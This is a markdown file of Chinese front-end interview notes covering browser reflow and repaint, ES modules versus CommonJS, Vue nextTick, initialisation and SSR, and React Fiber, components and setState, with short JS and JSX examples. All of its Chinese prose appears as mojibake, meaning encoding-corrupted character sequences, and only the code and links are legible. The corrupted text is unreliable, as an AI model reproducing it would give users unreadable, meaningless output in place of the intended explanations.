å›æµè¿‡ç¨‹ï¼šç”±äºDOMçš„ç»“æ„å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦ä»ç”ŸæˆDOMè¿™ä¸€æ­¥å¼€å§‹ï¼Œé‡æ–°ç»è¿‡`æ ·å¼è®¡ç®—`ã€`ç”Ÿæˆå¸ƒå±€æ ‘`ã€`å»ºç«‹å›¾å±‚æ ‘`ã€å†åˆ°`ç”Ÿæˆç»˜åˆ¶åˆ—è¡¨`ä»¥åŠä¹‹åçš„æ˜¾ç¤ºå™¨æ˜¾ç¤ºè¿™æ•´ä¸€ä¸ªæ¸²æŸ“è¿‡ç¨‹èµ°ä¸€éï¼Œå¼€é”€æ˜¯éå¸¸å¤§çš„ã€‚

**é‡ç»˜**ï¼š

è§¦å‘æ¡ä»¶ï¼š

å½“ DOM çš„ä¿®æ”¹å¯¼è‡´äº†æ ·å¼çš„å˜åŒ–ï¼Œå¹¶ä¸”æ²¡æœ‰å½±å“å‡ ä½•å±æ€§çš„æ—¶å€™ï¼Œä¼šå¯¼è‡´`é‡ç»˜`(`repaint`)ã€‚

é‡ç»˜è¿‡ç¨‹ï¼šç”±äºæ²¡æœ‰å¯¼è‡´ DOM å‡ ä½•å±æ€§çš„å˜åŒ–ï¼Œå› æ­¤å…ƒç´ çš„ä½ç½®ä¿¡æ¯ä¸éœ€è¦æ›´æ–°ï¼Œæ‰€ä»¥å½“å‘ç”Ÿé‡ç»˜çš„æ—¶å€™ï¼Œä¼šè·³è¿‡`ç”Ÿå­˜å¸ƒå±€æ ‘`å’Œ`å»ºç«‹å›¾å±‚æ ‘`çš„é˜¶æ®µï¼Œç›´æ¥åˆ°`ç”Ÿæˆç»˜åˆ¶åˆ—è¡¨`ï¼Œç„¶åç»§ç»­è¿›è¡Œåˆ†å—ã€ç”Ÿæˆä½å›¾ç­‰åé¢ä¸€ç³»åˆ—æ“ä½œã€‚

**å¦‚ä½•é¿å…è§¦å‘å›æµå’Œé‡ç»˜**ï¼š

1. é¿å…é¢‘ç¹ä½¿ç”¨ styleï¼Œè€Œæ˜¯é‡‡ç”¨ä¿®æ”¹`class`çš„æ–¹å¼ã€‚
2. å°†åŠ¨ç”»æ•ˆæœåº”ç”¨åˆ°`position`å±æ€§ä¸º`absolute`æˆ–`fixed`çš„å…ƒç´ ä¸Šã€‚
3. ä¹Ÿå¯ä»¥å…ˆä¸ºå…ƒç´ è®¾ç½®`display: none`ï¼Œæ“ä½œç»“æŸåå†æŠŠå®ƒæ˜¾ç¤ºå‡ºæ¥ã€‚å› ä¸ºåœ¨`display`å±æ€§ä¸º`none`çš„å…ƒç´ ä¸Šè¿›è¡Œçš„DOMæ“ä½œä¸ä¼šå¼•å‘å›æµå’Œé‡ç»˜
4. ä½¿ç”¨`createDocumentFragment`è¿›è¡Œæ‰¹é‡çš„ DOM æ“ä½œã€‚
5. å¯¹äº resizeã€scroll ç­‰è¿›è¡Œé˜²æŠ–/èŠ‚æµå¤„ç†ã€‚
6. é¿å…é¢‘ç¹è¯»å–ä¼šå¼•å‘å›æµ/é‡ç»˜çš„å±æ€§ï¼Œå¦‚æœç¡®å®éœ€è¦å¤šæ¬¡ä½¿ç”¨ï¼Œå°±ç”¨ä¸€ä¸ªå˜é‡ç¼“å­˜èµ·æ¥ã€‚
7. åˆ©ç”¨ CSS3 çš„`transform`ã€`opacity`ã€`filter`è¿™äº›å±æ€§å¯ä»¥å®ç°åˆæˆçš„æ•ˆæœï¼Œä¹Ÿå°±æ˜¯`GPU`åŠ é€Ÿã€‚

### è®²ä¸€ä¸‹åŸå‹é“¾

æ„é€ å‡½æ•° åŸå‹ å®ä¾‹å¯¹è±¡

### [Moduleå’ŒCommonJSçš„åŒºåˆ«](https://zhuanlan.zhihu.com/p/71098263)

ESMé™æ€åŠ è½½ ç¼–è¯‘æ—¶ç¡®å®šä¾èµ–å…³ç³» ä½†æ˜¯ä¹Ÿæä¾›äº†import()çš„å‡½æ•° å¯ä»¥è¿è¡Œæ—¶åŠ è½½ æ˜¯å¼‚æ­¥åŠ è½½  commonæ˜¯è¿è¡Œæ—¶åŠ è½½ åŒæ­¥åŠ è½½

ESMå¯ä»¥tree shaking

### requestAnimationFrame

### nextTick

åœ¨ä¸‹æ¬¡ DOM æ›´æ–°å¾ªç¯ç»“æŸä¹‹åæ‰§è¡Œå»¶è¿Ÿå›è°ƒã€‚åœ¨ä¿®æ”¹æ•°æ®ä¹‹åç«‹å³ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè·å–æ›´æ–°åçš„ DOM

Vue çš„å¼‚æ­¥æ›´æ–°æœºåˆ¶çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨äº†æµè§ˆå™¨çš„å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ—æ¥å®ç°çš„ï¼Œé¦–é€‰å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå®ä»»åŠ¡é˜Ÿåˆ—æ¬¡ä¹‹ã€‚

å› ä¸ºå®ä»»åŠ¡è€—è´¹çš„æ—¶é—´æ˜¯å¤§äºå¾®ä»»åŠ¡çš„ï¼Œæ‰€ä»¥å…ˆä½¿ç”¨å¾®ä»»åŠ¡ï¼Œåˆ¤æ–­é¡ºåºå¦‚ä¸‹

- `Promise`
- `MutationObserver`
- `setImmediate`
- `setTimeout`

### Vue2çš„åˆå§‹åŒ–è¿‡ç¨‹ä½ æœ‰è¿‡äº†è§£å—ï¼Œåšäº†å“ªäº›äº‹æƒ…

new Vueèµ°åˆ°äº†vueçš„æ„é€ å‡½æ•°ä¸­ï¼š`src\core\instance\index.js`æ–‡ä»¶ã€‚

this.[_init](https://github.com/vuejs/vue/blob/a9ca2d85193e435e668ba25ace481bfb176b0c6e/src/core/instance/index.ts)(options)

ç„¶åä»Mixinå¢åŠ çš„åŸå‹æ–¹æ³•çœ‹ï¼ŒinitMixin(Vue)ï¼Œè°ƒç”¨çš„æ˜¯ä¸ºVueå¢åŠ çš„åŸå‹æ–¹æ³•_init

```js
// src/core/instance/init.js

function initMixin (Vue) {
  Vue.prototype._init = function (options) {
     var vm = this; åˆ›å»ºvm, 
     ...
     // åˆå¹¶options åˆ° vm.$options
     vm.$options = mergeOptions(  
       resolveConstructorOptions(vm.constructor), 
       options || {},  
       vm 
     );
  }
  ...
   initLifecycle(vm); //åˆå§‹ç”Ÿå‘½å‘¨æœŸ
   initEvents(vm); //åˆå§‹åŒ–äº‹ä»¶
   initRender(vm); //åˆå§‹renderå‡½æ•°
   callHook(vm, 'beforeCreate'); //æ‰§è¡Œ beforeCreateç”Ÿå‘½å‘¨æœŸé’©å­
   ...
   initState(vm);  //åˆå§‹åŒ–dataï¼Œpropsï¼Œmethods computedï¼Œwatch 
   ...
   callHook(vm, 'created');  //æ‰§è¡Œ created ç”Ÿå‘½å‘¨æœŸé’©å­

   if (vm.$options.el) {
      vm.$mount(vm.$options.el);
   }
 }
```

æ€»ç»“

æ‰€ä»¥ï¼Œä»ä¸Šé¢çš„å‡½æ•°çœ‹æ¥ï¼Œnew vueæ‰€åšçš„äº‹æƒ…ï¼Œå°±åƒä¸€ä¸ªæµç¨‹å›¾ä¸€æ ·å±•å¼€äº†ï¼Œåˆ†åˆ«æ˜¯

-   åˆå¹¶é…ç½®
-   åˆå§‹åŒ–ç”Ÿå‘½å‘¨æœŸ
-   åˆå§‹åŒ–äº‹ä»¶
-   åˆå§‹åŒ–æ¸²æŸ“
-   è°ƒç”¨ `beforeCreate` é’©å­å‡½æ•°
-   init injections and reactivityï¼ˆè¿™ä¸ªé˜¶æ®µå±æ€§éƒ½å·²æ³¨å…¥ç»‘å®šï¼Œè€Œä¸”è¢« `$watch` å˜æˆreactivityï¼Œä½†æ˜¯ `$el` è¿˜æ˜¯æ²¡æœ‰ç”Ÿæˆï¼Œä¹Ÿå°±æ˜¯DOMæ²¡æœ‰ç”Ÿæˆï¼‰
-   åˆå§‹åŒ–stateçŠ¶æ€ï¼ˆåˆå§‹åŒ–äº†dataã€propsã€computedã€watcherï¼‰
-   è°ƒç”¨createdé’©å­å‡½æ•°ã€‚

åœ¨åˆå§‹åŒ–çš„æœ€åï¼Œæ£€æµ‹åˆ°å¦‚æœæœ‰ el å±æ€§ï¼Œåˆ™è°ƒç”¨ vm.$mount æ–¹æ³•æŒ‚è½½ vmï¼ŒæŒ‚è½½çš„ç›®æ ‡å°±æ˜¯æŠŠæ¨¡æ¿æ¸²æŸ“æˆæœ€ç»ˆçš„ DOMã€‚

### Vue SSR

[å…¥é—¨](https://developer.aliyun.com/article/891794#slide-1)

```markdown
ä¸ä¼ ç»Ÿ SPA (å•é¡µåº”ç”¨ç¨‹åº (Single-Page Application)) ç›¸æ¯”ï¼ŒæœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) çš„ä¼˜åŠ¿ä¸»è¦åœ¨äºï¼š

* Â  æ›´å¥½çš„ SEOï¼Œç”±äºæœç´¢å¼•æ“çˆ¬è™«æŠ“å–å·¥å…·å¯ä»¥ç›´æ¥æŸ¥çœ‹å®Œå…¨æ¸²æŸ“çš„é¡µé¢ã€‚
* Â  æ›´å¿«çš„å†…å®¹åˆ°è¾¾æ—¶é—´ (time-to-content)ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç¼“æ…¢çš„ç½‘ç»œæƒ…å†µæˆ–è¿è¡Œç¼“æ…¢çš„è®¾å¤‡ã€‚

Vue.js æ˜¯æ„å»ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¾“å‡º Vue ç»„ä»¶ï¼Œè¿›è¡Œç”Ÿæˆ DOM å’Œæ“ä½œ DOMã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥å°†åŒä¸€ä¸ªç»„ä»¶æ¸²æŸ“ä¸ºæœåŠ¡å™¨ç«¯çš„ HTML å­—ç¬¦ä¸²ï¼Œå°†å®ƒä»¬ç›´æ¥å‘é€åˆ°æµè§ˆå™¨ï¼Œæœ€åå°†è¿™äº›é™æ€æ ‡è®°"æ¿€æ´»"ä¸ºå®¢æˆ·ç«¯ä¸Šå®Œå…¨å¯äº¤äº’çš„åº”ç”¨ç¨‹åº

æœåŠ¡å™¨æ¸²æŸ“çš„ Vue.js åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥è¢«è®¤ä¸ºæ˜¯"åŒæ„"æˆ–"é€šç”¨"ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºçš„å¤§éƒ¨åˆ†ä»£ç éƒ½å¯ä»¥åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸Šè¿è¡Œ

åŒæ„
åŒä¸€å¥—vueä»£ç åœ¨æœåŠ¡ç«¯æ‰§è¡Œä¸€æ¬¡åœ¨å®¢æˆ·ç«¯å†æ‰§è¡Œä¸€æ¬¡
1. æœåŠ¡ç«¯æ‰§è¡Œå®Œæˆæ¸²æŸ“è§£å†³äº†é¦–æ¬¡åŠ è½½é€Ÿåº¦æ…¢çš„é—®é¢˜
2. æµè§ˆå™¨æ‰§è¡Œè§£å†³äº†ç»‘å®šäº‹ä»¶åŠæ¢å¤vueæœ¬èº«ç‰¹æ€§çš„é—®é¢˜


* Vue SSRæ˜¯ä¸€ä¸ªåœ¨SPAä¸Šè¿›è¡Œæ”¹è‰¯çš„æœåŠ¡ç«¯æ¸²æŸ“
* é€šè¿‡Vue SSRæ¸²æŸ“çš„é¡µé¢ï¼Œéœ€è¦åœ¨å®¢æˆ·ç«¯æ¿€æ´»æ‰èƒ½å®ç°äº¤äº’
* Vue SSRå°†åŒ…å«ä¸¤éƒ¨åˆ†ï¼šæœåŠ¡ç«¯æ¸²æŸ“çš„é¦–å±ï¼ŒåŒ…å«äº¤äº’çš„SPA

ä½¿ç”¨ssrä¸å­˜åœ¨å•ä¾‹æ¨¡å¼ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vueå®ä¾‹
å®ç°ssréœ€è¦å®ç°æœåŠ¡ç«¯é¦–å±æ¸²æŸ“å’Œå®¢æˆ·ç«¯æ¿€æ´»
æœåŠ¡ç«¯å¼‚æ­¥è·å–æ•°æ®asyncDataå¯ä»¥åˆ†ä¸ºé¦–å±å¼‚æ­¥è·å–å’Œåˆ‡æ¢ç»„ä»¶è·å–
é¦–å±å¼‚æ­¥è·å–æ•°æ®ï¼Œåœ¨æœåŠ¡ç«¯é¢„æ¸²æŸ“çš„æ—¶å€™å°±åº”è¯¥å·²ç»å®Œæˆ
åˆ‡æ¢ç»„ä»¶é€šè¿‡mixinæ··å…¥ï¼Œåœ¨beforeMounté’©å­å®Œæˆæ•°æ®è·å–
```

### Vueæ˜¯è¿è¡Œæ—¶ + ç¼–è¯‘æ—¶æ¡†æ¶

ç®€å•æ¥è¯´ï¼Œè¿è¡Œæ—¶æ˜¯æŒ‡ä¸€æ®µä»£ç ï¼Œç›´æ¥æ‰”è¿›æµè§ˆå™¨é‡Œèƒ½è¿è¡Œï¼Œç¼–è¯‘æ—¶æ˜¯æŒ‡ä¸€æ®µä»£ç ä¸èƒ½ç›´æ¥åœ¨æµè§ˆå™¨é‡Œè·‘ï¼Œéœ€è¦å…ˆç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘ï¼Œå†æ”¾åˆ°æµè§ˆå™¨é‡Œæ‰èƒ½è¿è¡Œã€‚

#### è¿è¡Œæ—¶

å¼€å‘è€…æŠŠæ ‘å‹ç»“æ„çš„æ•°æ®å¯¹è±¡ä¼ å…¥ render å‡½æ•°ï¼Œç„¶å render å‡½æ•°æ ¹æ®æ”¹å¯¹è±¡é€’å½’åœ°å°†æ•°æ®æ¸²æŸ“æˆ DOM å…ƒç´ ã€‚

```js

const node = {
  tag: 'div', // tagä»£è¡¨æ ‡ç­¾åç§°
  children: [ // childrenå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»£è¡¨å­èŠ‚ç‚¹
    {
      tag: 'h1',
      children: 'hello' // childrenä¹Ÿå¯ä»¥æ˜¯ä¸€æ®µæ–‡æœ¬ï¼Œä»£è¡¨æ–‡æœ¬å­èŠ‚ç‚¹
    }
  ]
}

function render (node, root) {
  const el = document.createElement(node.tag)
  if (typeof node.children === 'string') {
    const text = document.createTextNode(node.children)
    el.appendChild(text)
  }
  if (Array.isArray(node.children)) {
    node.children.forEach(child => render(child, el)) // é€’å½’åœ°å¤„ç†èŠ‚ç‚¹çš„æ¸²æŸ“
  }
  root.appendChild(el)
}
```

#### ç¼–è¯‘æ—¶

ä¸‹é¢è¿™æ®µä»£ç ï¼Œæµè§ˆå™¨é‡Œä¸èƒ½ç›´æ¥è·‘ï¼Œéœ€è¦å…ˆç¼–è¯‘æˆ JS ï¼Œæ‰èƒ½åœ¨æµè§ˆå™¨é‡Œè¿è¡Œã€‚

```js
<template>
  <div>
    <h1>hello</h1>
  </div>
</template>
```

è¿™æ®µ html ä»£ç åœ¨ Vue å†…éƒ¨è¢«ç¼–è¯‘æˆç±»ä¼¼ä¸‹é¢è¿™æ ·çš„ä»£ç ï¼Œä¹‹ååœ¨è¿è¡Œçš„æ—¶å€™æ‰§è¡Œï¼ŒæŠŠç”Ÿæˆçš„vnodeä¼ ç»™renderå‡½æ•°å»åˆ›å»ºçœŸå®çš„domæ”¾åˆ°é¡µé¢ä¸­

```js
import { createElementVNode as _createElementVNode, openBlock as _openBlock, createElementBlock as _createElementBlock } from "vue"
 
export function render(_ctx, _cache, $props, $setup, $data, $options) {
  return (_openBlock(), _createElementBlock("template", null, [
    _createElementVNode("div", null, [
      _createElementVNode("h1", null, "hello")
    ])
  ]))
}
```

### Vue3å¦‚ä½•æ”¯æŒå¤šæ ¹èŠ‚ç‚¹

vdomæ˜¯ä¸€é¢—å•æ ¹æ ‘å½¢ç»“æ„,`patch` æ–¹æ³•åœ¨éå†çš„æ—¶å€™ä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†ï¼Œå®ƒè¦æ±‚åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ã€‚ç»„ä»¶ä¹Ÿä¼šè½¬æ¢ä¸ºä¸€ä¸ªvdomï¼Œè‡ªç„¶åº”è¯¥æ»¡è¶³è¿™ä¸ªè¦æ±‚

vue3ä¸­ä¹‹æ‰€ä»¥å¯ä»¥å†™å¤šä¸ªæ ¹èŠ‚ç‚¹ï¼Œæ˜¯å› ä¸ºå¼•å…¥äº†`Fragment`çš„æ¦‚å¿µï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡çš„èŠ‚ç‚¹ï¼Œå¦‚æœå‘ç°ç»„ä»¶æ˜¯å¤šæ ¹çš„ï¼Œå°±åˆ›å»ºä¸€ä¸ª`Fragment`èŠ‚ç‚¹ï¼ŒæŠŠå¤šä¸ªæ ¹èŠ‚ç‚¹ä½œä¸ºå®ƒçš„childrenã€‚å°†æ¥`patch`çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°æ˜¯ä¸€ä¸ª`Fragment`èŠ‚ç‚¹ï¼Œåˆ™ç›´æ¥éå†childrenåˆ›å»ºæˆ–æ›´æ–°ã€‚

## React

### react FiberåŸç† [requestIdleCallback](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestIdleCallback) 

> ä¼šåœ¨æµè§ˆå™¨ç©ºé—²æ—¶æœŸä¾æ¬¡è°ƒç”¨å‡½æ•°ï¼Œè¿™å°±å¯ä»¥è®©å¼€å‘è€…åœ¨ä¸»äº‹ä»¶å¾ªç¯ä¸­æ‰§è¡Œåå°æˆ–ä½ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼Œè€Œä¸”ä¸ä¼šå¯¹åƒåŠ¨ç”»å’Œç”¨æˆ·äº¤äº’è¿™äº›å»¶è¿Ÿè§¦å‘ä½†å…³é”®çš„äº‹ä»¶äº§ç”Ÿå½±å“

https://www.cnblogs.com/queenya/p/13572754.html åšå®¢å›­

### Reactç»„ä»¶åŸºç¡€

### Reactäº‹ä»¶æœºåˆ¶ 

> [ã€Œreactè¿›é˜¶ã€ä¸€æ–‡åƒé€reactäº‹ä»¶ç³»ç»ŸåŸç†](./react/äº‹ä»¶æœºåˆ¶.md)

### å¯¹å‡½æ•°å¼ç¼–ç¨‹çš„ç†è§£

è¿™ç¯‡æ–‡ç« å†™çš„çœŸçš„å¤ªå¥½äº†ï¼Œä¸€å®šè¦è¯»ï¼š[ç®€æ˜ JavaScript å‡½æ•°å¼ç¼–ç¨‹â€”â€”å…¥é—¨ç¯‡](https://juejin.cn/post/6844903936378273799)ã€‚

æ€»ç»“ä¸€ä¸‹ï¼š å‡½æ•°å¼ç¼–ç¨‹æœ‰ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚

- **æ•°æ®ä¸å¯å˜ï¼ˆæ— å‰¯ä½œç”¨ï¼‰ï¼š** å®ƒè¦æ±‚ä½ æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä¸å¯å˜çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ æƒ³ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä½ åº”è¯¥åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ç”¨æ¥ä¿®æ”¹ï¼Œè€Œä¸æ˜¯ä¿®æ”¹å·²æœ‰çš„å¯¹è±¡ã€‚ä¸ä¿®æ”¹å…¨å±€å˜é‡ï¼Œä¸ä¿®æ”¹å…¥å‚
- **æ— çŠ¶æ€ï¼š** ä¸»è¦æ˜¯å¼ºè°ƒå¯¹äºä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡ä½ ä½•æ—¶è¿è¡Œï¼Œå®ƒéƒ½åº”è¯¥åƒç¬¬ä¸€æ¬¡è¿è¡Œä¸€æ ·ï¼Œç»™å®šç›¸åŒçš„è¾“å…¥ï¼Œç»™å‡ºç›¸åŒçš„è¾“å‡ºï¼Œå®Œå…¨ä¸ä¾èµ–å¤–éƒ¨çŠ¶æ€çš„å˜åŒ–ã€‚å‡½æ•°çš„çš„è¿è¡Œç»“æœä¸ä¾èµ–å…¨å±€å˜é‡ï¼Œthis æŒ‡é’ˆï¼ŒIO æ“ä½œç­‰ã€‚

çº¯å‡½æ•°å¸¦æ¥çš„æ„ä¹‰ã€‚

- **ä¾¿äºæµ‹è¯•å’Œä¼˜åŒ–**ï¼šè¿™ä¸ªæ„ä¹‰åœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­æ„ä¹‰éå¸¸å¤§ï¼Œç”±äºçº¯å‡½æ•°å¯¹äºç›¸åŒçš„è¾“å…¥æ°¸è¿œä¼šè¿”å›ç›¸åŒçš„ç»“æœï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è½»æ¾æ–­è¨€å‡½æ•°çš„æ‰§è¡Œç»“æœï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä¿è¯å‡½æ•°çš„ä¼˜åŒ–ä¸ä¼šå½±å“å…¶ä»–ä»£ç çš„æ‰§è¡Œã€‚
- **å¯ç¼“å­˜æ€§**ï¼šå› ä¸ºç›¸åŒçš„è¾“å…¥æ€»æ˜¯å¯ä»¥è¿”å›ç›¸åŒçš„è¾“å‡ºï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æå‰ç¼“å­˜å‡½æ•°çš„æ‰§è¡Œç»“æœã€‚
- **æ›´å°‘çš„ Bug**ï¼šä½¿ç”¨çº¯å‡½æ•°æ„å‘³ç€ä½ çš„å‡½æ•°ä¸­**ä¸å­˜åœ¨æŒ‡å‘ä¸æ˜çš„ thisï¼Œä¸å­˜åœ¨å¯¹å…¨å±€å˜é‡çš„å¼•ç”¨ï¼Œä¸å­˜åœ¨å¯¹å‚æ•°çš„ä¿®æ”¹**ï¼Œè¿™äº›å…±äº«çŠ¶æ€å¾€å¾€æ˜¯ç»å¤§å¤šæ•° bug çš„æºå¤´ã€‚

### ç±»ç»„ä»¶å’Œå‡½æ•°å¼ç»„ä»¶çš„åŒºåˆ«

#### è¯­æ³•ä¸Š

å‡½æ•°ç»„ä»¶æ˜¯ä¸€ä¸ªçº¯å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ª `props` å¯¹è±¡è¿”å›ä¸€ä¸ª `react` å…ƒç´ ï¼› ç±»ç»„ä»¶éœ€è¦å»ç»§æ‰¿ `React.Component` å¹¶ä¸”åˆ›å»º `render` å‡½æ•°è¿”å› `react` å…ƒç´ ï¼Œè™½ç„¶å®ç°çš„æ•ˆæœç›¸åŒï¼Œä½†éœ€è¦æ›´å¤šçš„ä»£ç ã€‚

#### çŠ¶æ€ç®¡ç†

ç±»ç»„ä»¶ setState() å‡½æ•°å¼ç»„ä»¶ç”¨useState()

#### ç”Ÿå‘½å‘¨æœŸ

å‡½æ•°å¼ç»„ä»¶è¦ç”¨hooks useEffectè¿™ç§

#### reactå†…éƒ¨è°ƒç”¨æ–¹å¼

å‡½æ•°å¼ç»„ä»¶æ˜¯å‡½æ•°å‡½æ•°ç›´æ¥æ‰§è¡Œ

```js
// ä½ çš„ä»£ç  
function SayHi() { 
    return <p>Hello, React</p> 
} 
// React å†…éƒ¨ 
const result = SayHi(props) // Â» <p>Hello, React</p>
```

classç»„ä»¶æ˜¯ç±»

```js
// ä½ çš„ä»£ç  
class SayHi extends React.Component { 
    render() { 
        return <p>Hello, React</p> 
    } 
} 
// React å†…éƒ¨ 
const instance = new SayHi(props) // Â» SayHi {} 
const result = instance.render() // Â» <p>Hello, React</p>
```

#### è·å–æ¸²æŸ“æ—¶çš„å€¼

```js
function ProfilePage(props) {
  const showMessage = () => {
    alert('Followed ' + props.user);
  }

  const handleClick = () => {
    setTimeout(showMessage, 3000);
  }

  return (
    <button onClick={handleClick}>Follow</button>
  )
}

```

```js
class ProfilePage extends React.Component {
  showMessage() {
    alert('Followed ' + this.props.user);
  }

  handleClick() {
    setTimeout(this.showMessage.bind(this), 3000);
  }

  render() {
    return <button onClick={this.handleClick.bind(this)}>Follow</button>
  }
}
```

**å‡½æ•°å¼ç»„ä»¶**ï¼šæŒ‰ä¸Šé¢æ‰€åˆ—çš„ä¸‰ä¸ªæ­¥éª¤æ“ä½œæ—¶ï¼Œå½“ç”¨æˆ·åœ¨ `3s` å‰æ›´æ”¹ä¸‹æ‹‰é€‰æ‹©æ¡†çš„é€‰é¡¹æ—¶ï¼Œç”¨æˆ·åä¼šç«‹é©¬æ”¹å˜ï¼Œè€Œ `3s` åå¼¹å‡ºçš„è­¦å‘Šæ¡†ä¸­çš„ç”¨æˆ·åå¹¶ä¸ä¼šæ”¹å˜

**ç±»ç»„ä»¶**ï¼šæŒ‰ä¸Šé¢æ‰€åˆ—çš„ä¸‰ä¸ªæ­¥éª¤æ“ä½œæ—¶ï¼Œå½“ç”¨æˆ·åœ¨ `3s` å‰æ›´æ”¹ä¸‹æ‹‰é€‰æ‹©æ¡†çš„é€‰é¡¹æ—¶ï¼Œç”¨æˆ·åä¼šç«‹é©¬æ”¹å˜ï¼Œè€Œ `3s` åå¼¹å‡ºçš„è­¦å‘Šæ¡†ä¸­çš„ç”¨æˆ·åä¹Ÿä¼šæ”¹å˜



### ç»„ä»¶é€šä¿¡

#### props

å­ç»„ä»¶

```js
//å­ç»„ä»¶
const Child = ({ param1, param2 }) => {
  return <>çˆ¶ç»„ä»¶ä¼ é€’çš„å‚æ•°ï¼š{param1},{param2}</>
}
```

çˆ¶ç»„ä»¶

```js
//çˆ¶ç»„ä»¶
const Parent = () => {
  return <Child //å­ç»„ä»¶
    params1="1"
    params2="2"
  />
}
```

#### forwardRef useImperativeHandle

```js
import { useRef, useImperativeHandle, useEffect, forwardRef } from 'react';

//çˆ¶ç»„ä»¶
const Parent = () => {//çˆ¶ç»„ä»¶
  const ref = useRef(); //ref
  useEffect(() => {
    console.log(ref)
  }, [])
  return (
    <Child //å­ç»„ä»¶
      ref={ref} //å°†refä¼ é€’ç»™å­ç»„ä»¶
    />)
}

-----------------------------------------
    
//å­ç»„ä»¶
const Child = forwardRef(({ },ref) => {
  useImperativeHandle(ref, () => ({
    data: 'æˆ‘æ˜¯å­ç»„ä»¶'
  }));
  return <>æˆ‘æ˜¯å­ç»„ä»¶</>
})
```

#### è·¨ç»„ä»¶ä¼ å€¼ï¼ˆçˆ¶ä¼ å­™å­ç»„ä»¶ï¼‰

```js
const myContext = createContext(null)

// çˆ¶ç»„ä»¶
const Parent = () => {
  //ä½¿ç”¨Providerä¼ é€’å€¼
  return <myContext.Provider value={{ param1: "1", param2: "2" }}>
    <Child1 />
  </myContext.Provider>
}

----------------------

//å­ç»„ä»¶
const Child1 = () => {
  return <Child2 />
}
  
-------------------------------------
    
import { useContext } from 'react';
import myContext from './context'
//å­å­ç»„ä»¶
const Child2 = () => {
  //é€šè¿‡useContextè·å–çˆ¶ç»„ä»¶çš„å€¼
  const { param1, param2 } = useContext(myContext)  
  return <>çˆ¶ç»„ä»¶ä¼ é€’çš„å‚æ•°ï¼š{param1},{param2}</>
}
```

#### Reduxã€ Reudx Toolkitç­‰çŠ¶æ€ç®¡ç†å·¥å…·

### setState

åŒæ­¥çš„ï¼Œæ‰€ä»¥ä¸æ˜¯å¾®ä»»åŠ¡ä¹Ÿä¸æ˜¯å®ä»»åŠ¡ï¼Œä½†æ˜¯è¢«reactå†™æˆäº†å¼‚æ­¥çš„æ ·å­,å…ˆæ‰§è¡Œå®ŒclickHandleå‡½æ•°ï¼Œç„¶åæ‰§è¡ŒsetStateçš„å›è°ƒï¼Œå› ä¸ºè¦åˆå¹¶æ“ä½œï¼Œæœ€åæ‰æ˜¯å¾®ä»»åŠ¡promiseï¼Œåˆ°promiseçš„æ—¶å€™è®¡ç®—éƒ½å·²ç»ç»“æŸäº†ã€‚

classç»„ä»¶é‡Œï¼Œä»¥ä¸‹ä»£ç è¾“å‡ºé¡ºåº 

start end state promise

```jsx
  clickHandle = () => {
    console.log('start')

    Promise.resolve().then(() => {
      console.log('promise')
    })

    this.setState((preState) => {
      return {
        ...preState,
        language: 'en'
      }
    },() => {
      console.log('state', this.state)
    })
    console.log('end')
  }
```

## Vueå’ŒReactåŒºåˆ«

### å“åº”å¼åŸç†ä¸åŒ

vueï¼švue2 Object.definedProperty() vue3 proxy

react: setState æ‰§è¡Œçš„æ—¶å€™è‡ªç„¶çŸ¥é“è¦ä¿®æ”¹æ•°æ®äº†

### ç›‘å¬æ•°æ®å˜åŒ–çš„å®ç°åŸç†ä¸åŒ

vue: é€šè¿‡ **getter/setter**ä»¥åŠä¸€äº›å‡½æ•°çš„åŠ«æŒï¼Œèƒ½ç²¾ç¡®çŸ¥é“æ•°æ®å˜åŒ–ã€‚

react: diffåˆ¤æ–­,å¦‚æœä¸ä¼˜åŒ–å¯èƒ½å¯¼è‡´å¤§é‡ä¸å¿…è¦çš„VDOMçš„é‡æ–°æ¸²æŸ“ã€‚pureComponent/shouldComponentUpdate/React.memo

### Diffç®—æ³•å¯¹æ¯”

- vue2å¯¹æ¯”èŠ‚ç‚¹ï¼Œå¦‚æœèŠ‚ç‚¹å…ƒç´ ç±»å‹ç›¸åŒï¼Œä½†æ˜¯classNameä¸åŒï¼Œè®¤ä¸ºæ˜¯ä¸åŒç±»å‹çš„å…ƒç´ ï¼Œä¼šè¿›è¡Œåˆ é™¤é‡å»ºï¼Œä½†æ˜¯reactåˆ™ä¼šè®¤ä¸ºæ˜¯åŒç±»å‹çš„èŠ‚ç‚¹ï¼Œåªä¼šä¿®æ”¹èŠ‚ç‚¹å±æ€§ã€‚
